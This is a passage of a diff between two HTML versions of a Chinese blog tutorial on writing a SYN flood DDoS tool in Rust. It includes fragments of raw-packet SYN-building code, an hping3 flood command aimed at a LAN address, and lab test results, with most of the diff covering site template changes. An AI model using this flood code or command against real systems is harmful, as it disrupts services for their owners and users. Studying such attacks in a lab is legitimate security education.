 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// TODO 可以改成多线程发送,性能能再提高
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="n">args</span><span class="p">.</span><span class="n">count</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 构建数据包
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="k">u8</span><span class="p">;</span><span class="w"> </span><span class="n">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TEST_DATA_LEN</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="k">u8</span><span class="p">;</span><span class="w"> </span><span class="no">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="no">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="no">TEST_DATA_LEN</span><span class="p">];</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">build_packet</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">source</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">packet</span><span class="p">[</span><span class="o">..</span><span class="p">]);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//println!(&#34;packet:{:#?}&#34;,packet);
@@ -485,10 +499,10 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">build_packet</span><span class="p">(</span><span class="n">source</span>:<span class="nb">String</span><span class="p">,</span><span class="n">target</span>:<span class="nb">String</span><span class="p">,</span><span class="n">port</span>:<span class="kt">u32</span><span class="p">,</span><span class="n">packet</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="p">[</span><span class="kt">u8</span><span class="p">])</span><span class="w"> </span>-&gt; <span class="nc">TcpPacket</span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Set data
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="n">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TCP_HEADER_LEN</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="n">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;e&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="n">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;s&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="n">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="err">情况</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="no">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="no">TCP_HEADER_LEN</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="no">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="no">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;e&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="no">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="no">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;s&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">packet</span><span class="p">[</span><span class="no">IPV4_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="no">TCP_HEADER_LEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u8</span><span class="p">;</span><span class="err">情况</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">ipv4_source</span>: <span class="nc">Ipv4Addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">source</span><span class="p">.</span><span class="n">parse</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">ipv4_destination</span>:<span class="nc">Ipv4Addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">target</span><span class="p">.</span><span class="n">parse</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
@@ -506,11 +520,11 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ip_header</span><span class="p">.</span><span class="n">set_checksum</span><span class="p">(</span><span class="n">checksum</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">rng</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">thread_rng</span><span class="p">();</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">tcp_header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MutableTcpPacket</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">packet</span><span class="p">[</span><span class="n">IPV4_HEADER_LEN</span><span class="o">..</span><span class="p">]).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">tcp_header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MutableTcpPacket</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">packet</span><span class="p">[</span><span class="no">IPV4_HEADER_LEN</span><span class="o">..</span><span class="p">]).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_source</span><span class="p">(</span><span class="n">rng</span><span class="p">.</span><span class="n">gen_range</span><span class="p">(</span><span class="mi">1000</span><span class="o">..</span><span class="mi">5000</span><span class="p">));</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_destination</span><span class="p">(</span><span class="n">port</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u16</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_sequence</span><span class="p">(</span><span class="n">random</span>::<span class="o">&lt;</span><span class="kt">u32</span><span class="o">&gt;</span><span class="p">());</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_flags</span><span class="p">(</span><span class="n">TcpFlags</span>::<span class="n">SYN</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_flags</span><span class="p">(</span><span class="n">TcpFlags</span>::<span class="no">SYN</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_window</span><span class="p">(</span><span class="n">rng</span><span class="p">.</span><span class="n">gen_range</span><span class="p">(</span><span class="mi">1000</span><span class="o">..</span><span class="mi">5000</span><span class="p">));</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_data_offset</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tcp_header</span><span class="p">.</span><span class="n">set_urgent_ptr</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">
@@ -563,37 +577,11 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
 <ul>
 <li>空闲情况</li>
 </ul>
-<p><img src="/p/rust-hacking-programing-syn-flood-ddos/assets/target-idel.png"
-	width="1037"
-	height="394"
-	srcset="/p/rust-hacking-programing-syn-flood-ddos/assets/target-idel_hu1e0e97c4ab36cd5e5ed5ff6fc5765707_50201_480x0_resize_box_3.png 480w, /p/rust-hacking-programing-syn-flood-ddos/assets/target-idel_hu1e0e97c4ab36cd5e5ed5ff6fc5765707_50201_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="空闲情况"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="263"
-		data-flex-basis="631px"
-	
-></p>
+<p><img src="assets/target-idel.png" alt="空闲情况"></p>
 <ul>
 <li>demo 攻击</li>
 </ul>
-<p><img src="/p/rust-hacking-programing-syn-flood-ddos/assets/target-under-attach.png"
-	width="1035"
-	height="731"
-	srcset="/p/rust-hacking-programing-syn-flood-ddos/assets/target-under-attach_hu8d272240f490459f2693749cf8c0abee_99420_480x0_resize_box_3.png 480w, /p/rust-hacking-programing-syn-flood-ddos/assets/target-under-attach_hu8d272240f490459f2693749cf8c0abee_99420_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="demo 攻击"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="141"
-		data-flex-basis="339px"
-	
-></p>
+<p><img src="assets/target-under-attach.png" alt="demo 攻击"></p>
 <ul>
 <li>hping3 攻击</li>
 </ul>
@@ -607,36 +595,10 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
 </span></span><span class="line"><span class="cl">sudo hping3 -i u1 -S -d <span class="m">1024</span> -p <span class="m">8080</span> 192.168.31.19
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/p/rust-hacking-programing-syn-flood-ddos/assets/hping3-attach.png"
-	width="1050"
-	height="543"
-	srcset="/p/rust-hacking-programing-syn-flood-ddos/assets/hping3-attach_hu724d22dbbc6b990ff4b11a334eadf6c4_59164_480x0_resize_box_3.png 480w, /p/rust-hacking-programing-syn-flood-ddos/assets/hping3-attach_hu724d22dbbc6b990ff4b11a334eadf6c4_59164_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="hping3 攻击"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="193"
-		data-flex-basis="464px"
-	
-></p>
+</div><p><img src="assets/hping3-attach.png" alt="hping3 攻击"></p>
 <h2 id="躺枪鸡">躺枪鸡</h2>
 <p><code>躺枪鸡</code>中使用 wireshark 监听到了<code>出头鸡</code> 发过来的 SYN ACK 数据包.</p>
-<p><img src="/p/rust-hacking-programing-syn-flood-ddos/assets/not-target.png"
-	width="739"
-	height="570"
-	srcset="/p/rust-hacking-programing-syn-flood-ddos/assets/not-target_hu3e9acb2a218e7e85dfa3356c57bd068b_134467_480x0_resize_box_3.png 480w, /p/rust-hacking-programing-syn-flood-ddos/assets/not-target_hu3e9acb2a218e7e85dfa3356c57bd068b_134467_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="躺枪鸡 SYN ACK 数据包"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="129"
-		data-flex-basis="311px"
-	
-></p>
+<p><img src="assets/not-target.png" alt="躺枪鸡 SYN ACK 数据包"></p>
 <h2 id="补充">补充</h2>
 <ol>
 <li>测试中我们的 demo 程序攻击有 30Mbps 左右的流量, cpu 波动 10% 左右, hping3 攻击的流量平均 37Mbps 左右, 这个流量受到 WIFI 环境影响很大,比如干扰,路由器不稳定等, 写文档之前, 我用 demo 测试可以达到 90Mbps 左右, hping3 则有 170Mbps 左右, 这个应该是正常的,我们的程序只是单线程, 还有提升的空间, 只是写文档时候测试达不到那个速率.</li>
@@ -650,248 +612,114 @@ SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只
 <li>syn 数据包不仅可以用来 DDoS 攻击, 还可以用于端口扫描, 如果发送 SYN , 接收到了 SYN ACK, 则是端口开放,如果没有收到数据包或者收到 RST ACK 则是端口关闭.</li>
 </ul>
 
-</section>
+
+      
+    </article>
+  </div>
+
+  
+</div>
 
 
-    <footer class="article-footer">
-    
-    <section class="article-tags">
-        
-            <a href="/tags/rust/">rust</a>
-        
-            <a href="/tags/hacking-programing/">hacking programing</a>
-        
-            <a href="/tags/syn-flood/">syn flood</a>
-        
-            <a href="/tags/ddos/">ddos</a>
-        
-    </section>
-
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-
-    
-</article>
-
-    
-
-    
-
-<aside class="related-contents--wrapper">
-    <h2 class="section-title">相关文章</h2>
-    <div class="related-contents">
-        <div class="flex article-list--tile">
             
-                
-<article class="has-image">
-    <a href="/p/rust-hacking-programing-icmp-ping/">
-        
-        
-            <div class="article-image">
-                <img src="/p/rust-hacking-programing-icmp-ping/assets/rust-icmp.5b1e56e0abe53472a45d2d1e3db7db6c_hu800d78222c26c310e1cb900728e26c37_48411_250x150_fill_box_smart1_3.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post Rust 黑客编程 - ICMP 协议 ping 的简单实现"
-                        data-key="rust-hacking-programing-icmp-ping" 
-                        data-hash="md5-Wx5W4KvlNHKkXS0ePbfbbA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Rust 黑客编程 - ICMP 协议 ping 的简单实现</h2>
-        </div>
-    </a>
-</article>
+            <footer class="flex justify-between items-center gap-2 px-4 py-12">
             
-        </div>
+              <div>
+  
+  <p>© 2024 Liangdi&#39;s Blog</p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+              <div
+  x-data="{ icons: [
+    { name: 'moon', status: 'y' },
+    { name: 'sunny', status: 'n' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center h-[32px] px-2 gap-2 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
     </div>
-</aside>
+  </template>
+</div>
 
-     
-    
-        
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2022 - 
-        
-        2023 Liangdi&#39;s Blog
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
-    </section>
-</footer>
-<script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?f334264cb8da1148de7654289682087c";
-      var s = document.getElementsByTagName("script")[0]; 
-      s.parentNode.insertBefore(hm, s);
-    })();
-    </script>
-    
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
+            </footer>
+          </div>
         </div>
+        <div class="back">
+          <div class="container">
+            
+            <div class="dream-grid">
+  
 
-        
-        <div class="pswp__ui pswp__ui--hidden">
+  
 
-            <div class="pswp__top-bar">
+  
+</div>
 
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
+            
+          </div>
         </div>
-
+      </div>
     </div>
 
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-
-            </main>
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">目录</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ol>
-    <li><a href="#概述">概述</a></li>
-    <li><a href="#syn-flood-原理">SYN Flood 原理</a></li>
-    <li><a href="#准备工作">准备工作</a></li>
-    <li><a href="#编码实现">编码实现</a></li>
-    <li><a href="#测试">测试</a>
-      <ol>
-        <li><a href="#攻击鸡19216831245">攻击鸡(192.168.31.245)</a></li>
-        <li><a href="#出头鸡1921683119">出头鸡(192.168.31.19)</a></li>
-      </ol>
-    </li>
-    <li><a href="#躺枪鸡">躺枪鸡</a></li>
-    <li><a href="#补充">补充</a></li>
-  </ol>
-</nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
-
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
+    <script>
+  window.lightTheme =  null 
+  window.darkTheme =  null 
 </script>
 
-    </body>
+
+  <script src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script>
+
+  
+  
+  <script src="/js/grid.js"></script>
+
+
+
+
+<script src="/js/main.js"></script>
+
+    
+
+
+
+
+
+
+
+    
+
+    
+
+    
+
+    <script type="module" src="https://unpkg.com/ionicons@7.4.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.4.0/dist/ionicons/ionicons.js"></script>
+  </body>
 </html>
